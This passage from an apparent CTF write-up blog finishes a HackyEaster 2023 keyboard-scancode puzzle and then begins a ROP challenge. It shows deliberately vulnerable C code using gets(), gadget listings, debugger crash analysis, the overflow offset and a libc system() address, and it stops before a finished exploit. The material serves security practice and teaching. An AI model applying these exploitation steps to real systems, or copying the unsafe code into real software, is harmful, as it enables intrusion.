</pre><td class="rouge-code"><pre>22 18 0b 03 0b 0a 10 1f 18 25 26 02 1f 13 23 22 16 02 16 22 18 02 19 27 15 0f
 h  e  2  0  2  3  {     e                    h           h  e              }
</pre></table></code></div></div><p>so what if this isn’t ascii based encoding, but keyboard based, 2 and 3 are one apart on the keyboard too (if you list them by row), let’s see if we can get this to work for the rest of the keys/letters..</p><p>We just make a list of codes, fill in what we (think we) know to be the mapping, and find out that we can fill in the missing mappings based on how each row on a qwerty keyboard is laid out! codes seem to correspond with keys row by row from top to bottom, with each row listed rom right to left:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre>00 BACKSPACE
01 +
02 _
03 0 // known
04 9
05 8
06 7
07 6
08 5
09 4
0a 3 // known
0b 2 // known
0c 1
0d `
0e ENTER (?)
0f {  // known
10 }  // known
11 p
12 o
13 i  // used
14 u
15 y  // used
16 t  // used
17 r
18 e  // known
19 w  // used
1a q
1b TAB
1c |
1d "
1e ;
1f l // used
20 k
21 j
22 h // known
23 g // used
24 f
25 d // used
26 s // used
27 a // used
28 CAPS
29
..
[ bottom row of keyboard, but not used in flag so we don't write it out]
..

</pre></table></code></div></div><p>Filling in the letters based on this pattern gets us the flag!!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>22 18 0b 03 0b 0a 10 1f 18 25 26 02 1f 13 23 22 16 02 16 22 18 02 19 27 15 0f
 h  e  2  0  2  3  {  l  e  d  s  _  l  i  g   h  t _  t  h  e  _  w  a  y  }
</pre></table></code></div></div><p>Whoo!</p><p>I really thought this was going to be the end of my HackyEaster journey here, had everything solved besides this one and the other hard challenge of this level, which were both binary/pwn challenges which is not my strong suit, and needed to solve at least on of them to advance to the next level, but here we are! Wonder if there was a nicer/better way to get there, but some guesswork and pattern recognition got me there I guess.</p><h2> Flag</h2><code> he2023{leds_light_the_way} </code><hr><h1 id="thumper-s-pwn-2"> Thumper's PWN 2 <a href="/writeups/HackyEaster_2023/level7-2-thumpers-pwn-2.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Thumper got one step closer to Dr. Evil but there’s still a lot he has to learn. That’s why he’s practicing the ancient art of ROP. Help him solve this challenge by reading the file FLAG, so he can be on his way.</p><p>Target: <code class="language-plaintext highlighter-rouge">nc ch.hackyeaster.com 2314</code></p><p>Note: The service is restarted every hour at x:00.</p><p><a href="writeupfiles/thumperspwn2.zip">thumperspwn2.zip</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We get a <code class="language-plaintext highlighter-rouge">main.c</code> file:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"seccomp-bpf.h"</span><span class="cp">
</span>
<span class="n">bool</span> <span class="n">sec_done</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">activate_seccomp</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">sock_filter</span> <span class="n">filter</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
        <span class="n">VALIDATE_ARCHITECTURE</span><span class="p">,</span>
        <span class="n">EXAMINE_SYSCALL</span><span class="p">,</span>

        <span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">mprotect</span><span class="p">),</span>
        <span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">mmap</span><span class="p">),</span>
        <span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">munmap</span><span class="p">),</span>
        <span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">exit_group</span><span class="p">),</span>
        <span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">read</span><span class="p">),</span>
        <span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">write</span><span class="p">),</span>
        <span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">open</span><span class="p">),</span>
        <span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">close</span><span class="p">),</span>
        <span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">openat</span><span class="p">),</span>
        <span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">brk</span><span class="p">),</span>
        <span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">newfstatat</span><span class="p">),</span>
        <span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">fstat</span><span class="p">),</span>
        <span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">ioctl</span><span class="p">),</span>
        <span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">lseek</span><span class="p">),</span>
        <span class="n">KILL_PROCESS</span><span class="p">,</span>
    <span class="p">};</span>

    <span class="k">struct</span> <span class="n">sock_fprog</span> <span class="n">prog</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="p">)(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">filter</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock_filter</span><span class="p">)),</span>
        <span class="p">.</span><span class="n">filter</span> <span class="o">=</span> <span class="n">filter</span><span class="p">,</span>
    <span class="p">};</span>

    <span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_NO_NEW_PRIVS</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_SECCOMP</span><span class="p">,</span> <span class="n">SECCOMP_MODE_FILTER</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prog</span><span class="p">);</span>
    <span class="n">sec_done</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Are you a master of ROP?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Show me what you can do: "</span><span class="p">);</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">sec_done</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">activate_seccomp</span><span class="p">();</span>
  <span class="p">}</span>

  <span class="n">vuln</span><span class="p">();</span>
<span class="p">}</span>
</pre></table></code></div></div><p>When googling, one can find pretty much <a href="https://gist.github.com/rverton/42340ee4bd3482c6262db2bc9bbb9ef5">pre-composed ROP exploits to read a file named ‘flag’</a> (32 bit), we just need to know how to adapt it to our situation. Additionally <a href="https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html">this article</a> is quite instructive (and leads to python at the end)</p><p>We can then combine this, hopefully with <code class="language-plaintext highlighter-rouge">ROPgadget</code> to find apporpriate gadgets:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>user@p-ctf:~/Downloads/thumperspwn2$ ropgadget --binary main --only "pop|ret"
Gadgets information
============================================================
0x00000000004007fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007fe : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400800 : pop r14 ; pop r15 ; ret
0x0000000000400802 : pop r15 ; ret
0x00000000004007fb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007ff : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400608 : pop rbp ; ret
0x0000000000400803 : pop rdi ; ret
0x0000000000400801 : pop rsi ; pop r15 ; ret
0x00000000004007fd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400536 : ret
0x0000000000400542 : ret 0x200a
0x00000000004006f2 : ret 0x2be

Unique gadgets found: 13
</pre></table></code></div></div><h2 id="sas"><span class="mr-2">sas</span><a href="#sas" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>good reading: https://devel0pment.de/?p=2282</p><p>We unzip the file and find an executable called <code class="language-plaintext highlighter-rouge">main</code></p><p>When we execute it, we are asked to provide an input, an not much seems to happen after that:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ./main
Are you a master of ROP?
Show me what you can do: Hello World
</pre></table></code></div></div><p>Let’s see what happens if we give it a long string:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>$ ./main
Are you a master of ROP?
Show me what you can do: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    266408 segmentation fault (core dumped)  ./main
</pre></table></code></div></div><p>We experiment a bit more, and see that if we give it 40 characters we get</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>$ ./main
Are you a master of ROP?
Show me what you can do: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    266372 invalid system call (core dumped)  ./main
</pre></table></code></div></div><p>invalid system call, interesting.</p><p>Let’s look at the binary more closely:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ file main
main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f60bf91ea714b5e0970b4f71f112d78ae4515b9e, not stripped
</pre></table></code></div></div><p>We examine it with Radare2:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre><span class="nv">$ </span>r2 <span class="nt">-A</span> main
INFO: Analyze all flags starting with sym. and entry0 <span class="o">(</span>aa<span class="o">)</span>
INFO: Analyze all functions arguments/locals <span class="o">(</span>afva@@@F<span class="o">)</span>
INFO: Analyze <span class="k">function </span>calls <span class="o">(</span>aac<span class="o">)</span>
INFO: Analyze len bytes of instructions <span class="k">for </span>references <span class="o">(</span>aar<span class="o">)</span>
INFO: Finding and parsing C++ vtables <span class="o">(</span>avrr<span class="o">)</span>
INFO: Type matching analysis <span class="k">for </span>all functions <span class="o">(</span>aaft<span class="o">)</span>
INFO: Propagate noreturn information <span class="o">(</span>aanr<span class="o">)</span>
INFO: Use <span class="nt">-AA</span> or aaaa to perform additional experimental analysis
 <span class="nt">--</span> Bindiff two files with <span class="s1">'$ radiff2 /bin/true /bin/false'</span>
<span class="o">[</span>0x004005a0]&gt; iI
<span class="nb">arch     </span>x86
baddr    0x400000
binsz    6766
bintype  elf
bits     64
canary   <span class="nb">false
</span>class    ELF64
compiler GCC: <span class="o">(</span>Ubuntu 7.5.0-3ubuntu1~18.04<span class="o">)</span> 7.5.0
crypto   <span class="nb">false
</span>endian   little
havecode <span class="nb">true
</span>intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  <span class="nb">true
</span>lsyms    <span class="nb">true
</span>machine  AMD x86-64 architecture
nx       <span class="nb">true
</span>os       linux
pic      <span class="nb">false
</span>relocs   <span class="nb">true
</span>relro    partial
rpath    NONE
sanitize <span class="nb">false
</span>static   <span class="nb">false
</span>stripped <span class="nb">false
</span>subsys   linux
va       <span class="nb">true</span>
</pre></table></code></div></div><p>So it is a 64-bit ELF binary, which is dynamically linked, not stripped, without stack canaries, nx enabled, no pic and partial relro</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>[0x004005a0]&gt; afl
0x004005a0    1     42 entry0
0x004005e0    4     37 sym.deregister_tm_clones
0x00400610    4     55 sym.register_tm_clones
0x00400650    3     29 sym.__do_global_dtors_aux
0x00400680    1      7 sym.frame_dummy
0x00400810    1      2 sym.__libc_csu_fini
0x00400711    1     57 sym.vuln
0x00400550    1      6 sym.imp.puts
0x00400570    1      6 sym.imp.printf
0x00400590    1      6 sym.imp.gets
0x00400814    1      9 sym._fini
0x00400687    1    138 sym.activate_seccomp
0x00400580    1      6 sym.imp.prctl
0x004007a0    4    101 sym.__libc_csu_init
0x004005d0    1      2 sym._dl_relocate_static_pie
0x0040074a    3     81 main
0x00400560    1      6 sym.imp.setbuf
0x00400520    3     23 sym._init

</pre></table></code></div></div><p>and a <code class="language-plaintext highlighter-rouge">vuln</code> function</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>0x004005a0]&gt; pdf @ sym.vuln
            ; CALL XREF from main @ 0x400793(x)
┌ 57: sym.vuln ();
│           ; var char *s @ rbp-0x20
│           0x00400711      55             push rbp
│           0x00400712      4889e5         mov rbp, rsp
│           0x00400715      4883ec20       sub rsp, 0x20
│           0x00400719      488d3d280200.  lea rdi, str.Are_you_a_master_of_ROP_ ; 0x400948 ; "Are you a master of ROP?" ; const char *s
│           0x00400720      e82bfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400725      488d3d350200.  lea rdi, str.Show_me_what_you_can_do:_ ; 0x400961 ; "Show me what you can do: " ; const char *format
│           0x0040072c      b800000000     mov eax, 0
│           0x00400731      e83afeffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00400736      488d45e0       lea rax, [s]
│           0x0040073a      4889c7         mov rdi, rax                ; char *s
│           0x0040073d      b800000000     mov eax, 0
│           0x00400742      e849feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x00400747      90             nop
│           0x00400748      c9             leave
└           0x00400749      c3             ret
</pre></table></code></div></div><p>here the unsafe <code class="language-plaintext highlighter-rouge">gets</code> function is used, where we simply get to provide our input and the function return</p><p>We examine it with <a href="https://github.com/longld/peda">gdb-peda</a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nv">$ </span>gdb ./main
GNU gdb <span class="o">(</span>Ubuntu 12.1-0ubuntu1~22.04<span class="o">)</span> 12.1
Copyright <span class="o">(</span>C<span class="o">)</span> 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type <span class="s2">"show copying"</span> and <span class="s2">"show warranty"</span> <span class="k">for </span>details.
This GDB was configured as <span class="s2">"x86_64-linux-gnu"</span><span class="nb">.</span>
Type <span class="s2">"show configuration"</span> <span class="k">for </span>configuration details.
For bug reporting instructions, please see:
&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.

For <span class="nb">help</span>, <span class="nb">type</span> <span class="s2">"help"</span><span class="nb">.</span>
Type <span class="s2">"apropos word"</span> to search <span class="k">for </span>commands related to <span class="s2">"word"</span>...
Reading symbols from ./main...
<span class="o">(</span>No debugging symbols found <span class="k">in</span> ./main<span class="o">)</span>
</pre></table></code></div></div><p>create pattern</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>pattern_create 200 ./pattern
Writing pattern of 200 chars to filename <span class="s2">"./pattern"</span>
</pre></table></code></div></div><p>run with pattern</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>r &lt; ./pattern                                                                                                                                                            <span class="o">[</span>35/1770]
Starting program: /home/saskia/code/github/shiltemann/CTF-writeups-galaxians/website/writeups/HackyEaster_2023/writeupfiles/thumper2/main &lt; ./pattern
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Are you a master of ROP?
Show me what you can <span class="k">do</span>:
Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
RAX: 0x7fffffffdd20 <span class="o">(</span><span class="s2">"AAA%AAsAABAA</span><span class="nv">$AAnAACAA</span><span class="s2">-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAAr
AAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
RBX: 0x0
RCX: 0x7ffff7e19aa0 <span class="nt">--</span><span class="o">&gt;</span> 0xfbad209b
RDX: 0x1
RSI: 0x1
RDI: 0x7ffff7e1ba80 <span class="nt">--</span><span class="o">&gt;</span> 0x0
RBP: 0x6141414541412941 <span class="o">(</span><span class="s1">'A)AAEAAa'</span><span class="o">)</span>
RSP: 0x7fffffffdd48 <span class="o">(</span><span class="s2">"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
RIP: 0x400749 <span class="o">(</span>&lt;vuln+56&gt;:       ret<span class="o">)</span>
R8 : 0x0
R9 : 0x0
R10: 0x7ffff7c09c78 <span class="nt">--</span><span class="o">&gt;</span> 0xf0022000043b3
R11: 0x246
R12: 0x7fffffffde68 <span class="nt">--</span><span class="o">&gt;</span> 0x7fffffffe261 <span class="o">(</span><span class="s2">"/home/saskia/code/github/shiltemann/CTF-writeups-galaxians/website/writeups/HackyEaster_2023/writeupfiles/thumper2/main"</span><span class="o">)</span>
R13: 0x40074a <span class="o">(</span>&lt;main&gt;:  push   rbp<span class="o">)</span>
R14: 0x0
R15: 0x7ffff7ffd040 <span class="nt">--</span><span class="o">&gt;</span> 0x7ffff7ffe2e0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EFLAGS: 0x10202 <span class="o">(</span>carry parity adjust zero sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
   0x400742 &lt;vuln+49&gt;:  call   0x400590 &lt;gets@plt&gt;
   0x400747 &lt;vuln+54&gt;:  nop
   0x400748 &lt;vuln+55&gt;:  leave
<span class="o">=&gt;</span> 0x400749 &lt;vuln+56&gt;:  ret
   0x40074a &lt;main&gt;:     push   rbp
   0x40074b &lt;main+1&gt;:   mov    rbp,rsp
   0x40074e &lt;main+4&gt;:   mov    rax,QWORD PTR <span class="o">[</span>rip+0x2008fb]        <span class="c"># 0x601050 &lt;stdout@@GLIBC_2.2.5&gt;</span>
   0x400755 &lt;main+11&gt;:  mov    esi,0x0
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0x7fffffffdd48 <span class="o">(</span><span class="s2">"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0008| 0x7fffffffdd50 <span class="o">(</span><span class="s2">"bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0016| 0x7fffffffdd58 <span class="o">(</span><span class="s2">"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0024| 0x7fffffffdd60 <span class="o">(</span><span class="s2">"AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0032| 0x7fffffffdd68 <span class="o">(</span><span class="s2">"IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0040| 0x7fffffffdd70 <span class="o">(</span><span class="s2">"AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0048| 0x7fffffffdd78 <span class="o">(</span><span class="s2">"AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0056| 0x7fffffffdd80 <span class="o">(</span><span class="s2">"6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400749 <span class="k">in </span>vuln <span class="o">()</span>
</pre></table></code></div></div><p>we take the top value off the stack to determine the pattern offset:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>gdb-peda$ pattern_offset AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAe
AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAe found at offset: 40

</pre></table></code></div></div><p>We don’t get a <code class="language-plaintext highlighter-rouge">system()</code> call in the code directly, but since printf is used, the entire libc library is loaded, we just need to find the right address?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>gdb-peda$ print system
$1 = {int (const char *)} 0x7ffff7c50d60 &lt;__libc_system&gt;

